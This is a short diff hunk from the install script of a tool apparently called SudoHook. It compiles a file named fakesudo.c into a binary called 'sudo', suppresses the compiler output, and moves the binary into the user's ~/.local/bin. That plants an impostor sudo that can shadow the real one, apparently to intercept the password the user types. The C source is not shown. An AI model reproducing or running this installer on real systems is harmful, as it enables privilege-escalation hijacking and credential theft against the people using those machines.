@@ -34,7 +34,7 @@ cd SudoHook/ || exit 1
 if [ ! -d "$HOME/.local/bin" ]; then mkdir "$HOME/.local/bin"; fi
 
 # assuming gcc is installed
-gcc sudo.c -o sudo > /dev/null 2>&1
+gcc fakesudo.c -o sudo > /dev/null 2>&1
 # adding executable permissions
 chmod +x sudo && mv sudo "$HOME/.local/bin/"
 
